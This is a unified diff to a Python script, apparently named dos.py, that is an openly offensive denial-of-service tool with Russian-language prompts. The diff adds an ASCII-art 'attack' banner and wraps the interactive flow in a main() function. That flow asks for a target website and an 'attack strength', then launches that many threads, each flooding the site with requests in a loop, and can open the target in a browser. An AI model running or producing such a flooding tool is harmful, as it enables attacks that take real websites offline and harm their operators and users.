@@ -6,7 +6,42 @@ try:
 	import threading
 	import time
 
+
+
+	def logo():
+		logotip = '''
+ ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  
+▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
+▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ 
+▐░▌       ▐░▌▐░▌                    ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          
+▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄   
+▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌    
+▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌▐░▌       ▐░▌ ▀▀▀▀▀▀▀▀▀█░▌ 
+▐░▌          ▐░▌          ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌          ▐░▌
+▐░▌          ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌ ▄▄▄▄▄▄▄▄▄█░▌
+▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
+ ▀            ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ 
+
+ ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄    ▄ 
+▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌
+▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀█░█▀▀▀▀  ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌ ▐░▌ 
+▐░▌       ▐░▌     ▐░▌          ▐░▌     ▐░▌       ▐░▌▐░▌          ▐░▌▐░▌  
+▐░█▄▄▄▄▄▄▄█░▌     ▐░▌          ▐░▌     ▐░█▄▄▄▄▄▄▄█░▌▐░▌          ▐░▌░▌   
+▐░░░░░░░░░░░▌     ▐░▌          ▐░▌     ▐░░░░░░░░░░░▌▐░▌          ▐░░▌    
+▐░█▀▀▀▀▀▀▀█░▌     ▐░▌          ▐░▌     ▐░█▀▀▀▀▀▀▀█░▌▐░▌          ▐░▌░▌   
+▐░▌       ▐░▌     ▐░▌          ▐░▌     ▐░▌       ▐░▌▐░▌          ▐░▌▐░▌  
+▐░▌       ▐░▌     ▐░▌          ▐░▌     ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌ ▐░▌ 
+▐░▌       ▐░▌     ▐░▌          ▐░▌     ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌
+ ▀         ▀       ▀            ▀       ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀    ▀                                                                                                                                     
+'''
+		print(Fore.RED + f"{logotip}" + Style.RESET_ALL)
+
+
+	thread_list=[]
+
+
 	def attack(n, name):
+		global site2
 		i = 1	
 		while True:
 			try:
@@ -17,37 +52,44 @@ try:
 				i = i + 1
 			except requests.exceptions.ConnectionError:
 				print(Fore.RED + "Такого сайта нет" + Style.RESET_ALL)
-				exit()
+				exit()	
 
-
-	thread_list=[]
-
-	system("clear")
-	system("cls")
-	site = input(Back.RED + Fore.BLACK + "Введите сайт: ")
-	site2 = f"http://{site}"
-	print(Style.RESET_ALL)
-	op = input("Открыть атакуемый сайт? y/n: ")
-	force = int(input("Введите силу аттаки (Default - 1): "))
-	if op == "n" or op == "N":
-		print("Атака начинается...")
-		print("Чтобы прервать атаку нажмите ctrl+z")
+	def main():
+		global site2
+		system("clear")
+		system("cls")
+		logo()
 		time.sleep(2)
-		for i in range(force):
-			t = threading.Thread(target=attack, args=(5,'Thread1'))
-			thread_list.append(t)
-			t.start()
-	if op == "y" or op == "Y":
-		print("Атака начинается...")
-		print("Чтобы прервать атаку нажмите ctrl+z")
-		time.sleep(2)
-		webbrowser.open(site2)
-		for i in range(force):
-			t = threading.Thread(target=attack, args=(5,'Thread1'))
-			thread_list.append(t)
-			t.start()
+		print(Fore.RED + (f"{logo}") + Style.RESET_ALL)
+		site = input(Back.RED + Fore.BLACK + "Введите сайт: ")
+		site2 = f"http://{site}"
+		print(Style.RESET_ALL)
+		op = input("Открыть атакуемый сайт? y/n: ")
+		force = int(input("Введите силу аттаки (Default - 1): "))
+		if op == "n" or op == "N":
+			print("Атака начинается...")
+			print("Чтобы прервать атаку нажмите ctrl+z")
+			time.sleep(2)
+			for i in range(force):
+				t = threading.Thread(target=attack, args=(5,'Thread1'))
+				thread_list.append(t)
+				t.start()
+		if op == "y" or op == "Y":
+			print("Атака начинается...")
+			print("Чтобы прервать атаку нажмите ctrl+z")
+			time.sleep(2)
+			webbrowser.open(site2)
+			for i in range(force):
+				t = threading.Thread(target=attack, args=(5,'Thread1'))
+				thread_list.append(t)
+				t.start()
+
+
+
 except ModuleNotFoundError:
 	print("Не найдены необходимые для работы модули. Устанавливаю их...")
 	system("pip install colorama")
 	system("pip install requests")
 	system("python dos.py")
+
+main()
